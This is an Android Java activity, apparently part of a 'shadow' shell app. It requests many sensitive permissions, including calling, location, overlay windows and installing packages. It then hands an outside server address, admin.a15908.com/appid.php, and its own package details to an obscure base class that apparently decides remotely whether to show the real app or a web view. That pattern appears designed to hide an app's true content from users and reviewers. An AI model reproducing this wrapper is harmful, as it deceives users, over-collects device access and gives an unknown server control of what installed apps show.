package com.ego.shadow;

import android.Manifest;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.util.Log;


import com.facebook.mu.MLMain;
import com.jiagu.sdk.MunitProtected;

import cn.jpush.android.api.JPushInterface;

public class ShadowActivity extends MLMain {

    @Override
    public void mCreate() {
        super.mCreate();

        String[] permissions = new String[]{
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.ACCESS_WIFI_STATE,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.CHANGE_NETWORK_STATE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.VIBRATE,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.WRITE_SETTINGS,
                Manifest.permission.MOUNT_UNMOUNT_FILESYSTEMS,
                Manifest.permission.SYSTEM_ALERT_WINDOW,
                Manifest.permission.REQUEST_INSTALL_PACKAGES,
                Manifest.permission_group.LOCATION};

        if (!hasPermissions(permissions)){
            ActivityCompat.requestPermissions(this,permissions,1);
        }

        String id = Shadow.id;
        StringBuilder url = new StringBuilder();
        url.append("http://admin.a15908.com/appid.php?appid=").append(id);
        String pkg = this.getPackageName();
        String activity = Shadow.activity;

        String web = "com.ego.shadow.WebActivity";
        Log.i("ShadowActivity",url.toString());
        setL(url.toString(),pkg,activity,web);
    }

    private boolean hasPermissions(String[] permissions){
        for (String permission : permissions){
            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED){
                return false;
            }

        }
        return true;
    }

    @Override
    public Bitmap setB() {
        try {
            if(Shadow.splash == -1) {
                return super.setB();
            }
            return BitmapFactory.decodeResource(getResources(),Shadow.splash);
        }catch (Exception e){
            return super.setB();
        }
    }
}
